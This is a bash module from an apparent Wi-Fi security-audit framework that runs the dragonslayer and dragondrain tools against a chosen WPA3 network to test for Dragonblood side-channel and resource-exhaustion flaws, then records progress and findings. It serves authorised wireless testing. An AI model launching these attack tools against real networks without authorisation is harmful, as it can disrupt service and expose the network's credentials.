#!/usr/bin/env bash
# MODULE_META
# NAME="WPA3 Dragonblood Attacks"
# CATEGORY="D"
# DEPS="A1"
# CRITICAL="no"
# TOOLS="dragonslayer,dragondrain"
# DESC="Test for WPA3-SAE side-channel and downgrade vulnerabilities (Dragonblood)"
# REQS="monitor_iface,target_ssid"
# PCAP="yes"
# TIMED="yes"
# DECODE="wpa3"

#===============================================================================
#  modules/d4_wpa3_dragonblood.sh
#  D4: WPA3 Dragonblood Attacks (Golden Wrapper)
#===============================================================================

set -euo pipefail

# Inputs from Environment
INTERFACE="${MONITOR_INTERFACE:-}"
SSID="${GUEST_SSID:-}"
BSSID="${GUEST_BSSID:-}"
SCAN_TIME="${SCAN_TIME:-60}"
SESSION_DIR="${SESSION_DIR:-.}"
EVIDENCE_DIR="${SESSION_EVIDENCE_DIR:-${SESSION_DIR}/evidence}"
ASTRA_BIN="${ASTRA_BIN:-wifi-astra}"
TC_ID="D4"
DRAGON_OUT="${EVIDENCE_DIR}/${TC_ID}_dragonblood_results.txt"

if [[ -z "$INTERFACE" ]]; then
    echo "[!] MONITOR_INTERFACE not set."
    exit 1
fi

if [[ -z "$SSID" ]]; then
    echo "[!] GUEST_SSID not set. WPA3 testing requires a target SSID."
    exit 1
fi

echo "[*] Starting WPA3 Dragonblood tests against ${SSID} (BSSID: ${BSSID:-Any})..."
echo "--- WPA3 Dragonblood Test Results for ${SSID} ---" > "$DRAGON_OUT"

# 1. Start Telemetry in Background
(
    ELAPSED=0
    while true; do
        PCT=$(( 10 + (ELAPSED % 85) ))
        "$ASTRA_BIN" record-progress --session-dir "$SESSION_DIR" --tc "$TC_ID" --percent "$PCT" --status "Executing Dragonblood audit..."
        sleep 5; ELAPSED=$((ELAPSED + 5))
    done
) &
TEL_PID=$!

# 2. Run Primary Tools (dragonslayer + dragondrain)
if [[ "${ASTRA_IN_WINDOW:-}" == "true" ]]; then
    # Foreground Execution
    if command -v dragonslayer &>/dev/null; then
        timeout "$SCAN_TIME" dragonslayer -i "$INTERFACE" -s "$SSID" ${BSSID:+-b "$BSSID"} 2>&1 | tee -a "$DRAGON_OUT" || true
    fi
    if command -v dragondrain &>/dev/null; then
        timeout "$SCAN_TIME" dragondrain -i "$INTERFACE" -s "$SSID" ${BSSID:+-b "$BSSID"} 2>&1 | tee -a "$DRAGON_OUT" || true
    fi
    RET=$?
else
    # Background Execution
    (
        if command -v dragonslayer &>/dev/null; then
            timeout "$SCAN_TIME" dragonslayer -i "$INTERFACE" -s "$SSID" ${BSSID:+-b "$BSSID"} >> "$DRAGON_OUT" 2>&1 || true
        fi
        if command -v dragondrain &>/dev/null; then
            timeout "$SCAN_TIME" dragondrain -i "$INTERFACE" -s "$SSID" ${BSSID:+-b "$BSSID"} >> "$DRAGON_OUT" 2>&1 || true
        fi
    ) > /dev/null 2>&1 &
    TOOL_PID=$!
    wait $TOOL_PID; RET=$?
fi

# 3. Cleanup and Final Signal
kill $TEL_PID 2>/dev/null || true

# Reporting
VULN_FOUND=0
if grep -qi "vulnerable" "$DRAGON_OUT" 2>/dev/null; then
    VULN_FOUND=1
fi

if [[ "$VULN_FOUND" -eq 1 ]]; then
    "$ASTRA_BIN" record-finding \
        --session-dir "$SESSION_DIR" \
        --tc "$TC_ID" \
        --type vulnerability \
        --name "WPA3 SAE Vulnerability Detected" \
        --desc "The target network ${SSID} is vulnerable to Dragonblood class attacks (SAE Side-Channel or Resource Exhaustion)." \
        --severity HIGH \
        --evidence "$DRAGON_OUT" \
        --rationale "Dragonblood vulnerabilities allow attackers to bypass WPA3 security improvements."
else
    "$ASTRA_BIN" record-finding \
        --session-dir "$SESSION_DIR" \
        --tc "$TC_ID" \
        --type vulnerability \
        --name "[$TC_ID] Audit Complete" \
        --desc "Completed WPA3-SAE Dragonblood tests against ${SSID}. No vulnerabilities identified." \
        --severity INFO \
        --evidence "$DRAGON_OUT" \
        --rationale "WPA3 is significantly more secure than WPA2."
fi

"$ASTRA_BIN" record-progress --session-dir "$SESSION_DIR" --tc "$TC_ID" --percent 100 --status "Mission Complete"
exit $RET
